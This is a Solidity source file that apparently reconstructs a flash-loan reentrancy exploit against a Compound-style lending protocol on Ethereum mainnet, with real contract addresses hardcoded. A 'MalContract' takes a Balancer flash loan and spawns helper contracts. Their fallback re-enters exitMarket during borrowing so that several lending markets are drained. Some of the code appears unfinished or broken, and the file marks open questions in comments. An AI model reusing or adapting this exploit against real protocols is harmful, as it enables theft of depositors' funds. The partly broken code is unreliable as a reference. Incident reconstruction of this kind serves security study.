pragma solidity ^0.7.0;

// import "github.com/ethereum/dapp-bin/library/math.sol";
// import "./cc.sol";

// import "./balancer-v2-monorepo/pkg/vault/contracts/Vault.sol";

contract CEther  {
  function borrow(uint borrowAmount) external returns (uint) {}
}

contract Unitroller {
  // function oracle()
}

contract BalancerVault {
  function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    )  public {}
}

contract AbstractFiatTokenV1 {
    function approve(
        address owner,
        address spender,
        uint256 value
    ) public {}

    function transfer(
        address from,
        address to,
        uint256 value
    ) public {}
}

 contract CERC20Delegator {
  function transfer(address dst, uint amount) external  returns (bool) {}
  function approve(address spender, uint256 amount) external  returns (bool) {}
  function accrueInterest() public  returns (uint) {}
  function mint(uint mintAmount) external  returns (uint) {}
  function redeemUnderlying(uint redeemAmount) external  returns (uint) {}
  function borrow(uint borrowAmount) external  returns (uint) {}

}

contract Comptroller {
  function enterMarkets(address[] memory cTokens) public  returns (uint[] memory) {}
  function exitMarket(address cTokenAddress) external  returns (uint) {}
}


 contract WETH_c {
  function withdraw(uint256) external {}
  function deposit() public payable {}
  function transfer(address dst, uint wad) public  returns (bool) {}
}

// 0x03296d34fd6b3619a75860f44a0d2c68336708e7 created by malicious contract
contract FirstContract {

  // addres of malicious parent contract
  address parent;
        
  // addresses
  address cEther_addr = 0x26267e41CeCa7C8E0f143554Af707336f27Fa051;
  address Unitroller_addr = 0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F;
  address BalancerVault_addr = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

  address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address fETH_127 = 0x26267e41CeCa7C8E0f143554Af707336f27Fa051;
  // cTokens
  address ebe0d1_addr = 0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47;


  Comptroller unitroller = Comptroller(Unitroller_addr);
  CERC20Delegator usdc = CERC20Delegator(USDC);
  CERC20Delegator ebe0d1 = CERC20Delegator(ebe0d1_addr);
  CEther fETH_127_cEther = CEther(fETH_127);

  constructor(address _parent) {
    parent = _parent;
  }

  function setup(address[] memory cTokens) public {
    unitroller.enterMarkets(cTokens);
  }

  function mint() public {
    // get allowance

    // set allowance
    usdc.approve(ebe0d1_addr, 115792089237316195423570985008687907853269984665640564039457584007913129639935);

    ebe0d1.accrueInterest();

    ebe0d1.mint(150000000000000);

  } 

  function borrow(uint borrowAmount) public returns (uint) {
    fETH_127_cEther.borrow(borrowAmount);
  }

  // fallback function, will do reentrancy on Unitroller.exitMarket()
  fallback() external payable {
    unitroller.exitMarket(ebe0d1_addr);
  }

  function redeemAll() public {

    ebe0d1.approve(ebe0d1_addr, 115792089237316195423570985008687907853269984665640564039457584007913129639935);
    ebe0d1.redeemUnderlying(150000000000000);

    usdc.transfer(parent, 150000000000000);

  }

}


contract MalContract {

  // address of the attacker who created this contract
  address public parent;

      
  // addresses
  address cEther_addr = 0x26267e41CeCa7C8E0f143554Af707336f27Fa051;
  address Unitroller_addr = 0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F;
  address BalancerVault_addr = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

  address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address fETH_127 = 0x26267e41CeCa7C8E0f143554Af707336f27Fa051;
  
  address cERC20Delegator_addr = 0xe097783483D1b7527152eF8B150B99B9B2700c8d;

  // cTokens
  address ebe0d1_addr = 0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47;
  address x8922c_addr = 0x8922C1147E141C055fdDfc0ED5a119f3378c8ef8;

  // contracts
  CEther cEther = CEther(cEther_addr);
  CERC20Delegator usdc = CERC20Delegator(USDC);
  BalancerVault vault = BalancerVault(BalancerVault_addr); 
  WETH_c weth_contr = WETH_c(WETH);
  CERC20Delegator fETH_127_cont = CERC20Delegator(fETH_127);
  Comptroller unitroller = Comptroller(Unitroller_addr);
  CERC20Delegator ebe0d1 = CERC20Delegator(ebe0d1_addr);
  CERC20Delegator cERC20Delegator = CERC20Delegator(cERC20Delegator_addr);
  CERC20Delegator x8922c = CERC20Delegator(x8922c_addr);


  // initialsise and lunch attack
  function launch() public returns (uint) {

    address[] memory coins = new address[](2);
    coins[0] = USDC; coins[1] = WETH;

    uint256[] memory amts = new uint256[](2);
    amts[0] = 150000000000000;
    amts[1] = 50000000000000000000000;
    vault.flashLoan(address(this), coins, amts, '');

    // uint r = cEther.borrow(amt);
    return 0;
    
  }

  function receiveFlashLoan (
    address[] memory tokens, 
    uint256[] memory amounts, 
    uint256[] memory feeAmounts, 
    bytes memory userData
    ) public {
    
    // create the other contract
    FirstContract firstContr = new FirstContract(address(this));
    usdc.transfer(address(firstContr), 150000000000000);

    address[] memory cTokens;


    // = address[](1); 
    cTokens[0]= ebe0d1_addr;
    firstContr.setup(cTokens);
    firstContr.mint();
    firstContr.borrow(1977579153781557429247);
    firstContr.redeemAll();

    weth_contr.withdraw(50000000000000000000000);
    
    fETH_127_cont.mint(50000000000000000000000);
    cTokens[0] = fETH_127;
    unitroller.enterMarkets(cTokens);

    // Unitroller . borrowCaps ( anonymous = 0xebe0d1cb6a0b8569929e062d67bfbc07608f0a47 )

    ebe0d1.borrow(7144266341363);

    cERC20Delegator.borrow(132959900829);

    x8922c.borrow(776937058467725803492533);


    FirstContract firstContr_x4ec88 = new FirstContract(address(this));
    usdc.transfer(address(firstContr_x4ec88), 150000000000000);

    cTokens[0]= ebe0d1_addr;
    firstContr_x4ec88.setup(cTokens);
    firstContr_x4ec88.mint();
    firstContr_x4ec88.borrow(47072970419999996575297);
    firstContr_x4ec88.redeemAll();

    fETH_127_cont.redeemUnderlying(2927029580000003424703); // is there more to this in subcalls?

    weth_contr.deposit{value: 50000000000000000000000}();

    weth_contr.transfer(BalancerVault_addr, 50000000000000000000000);

    usdc.transfer(BalancerVault_addr, 150000000000000);

  }


  fallback() external payable {

  }

}

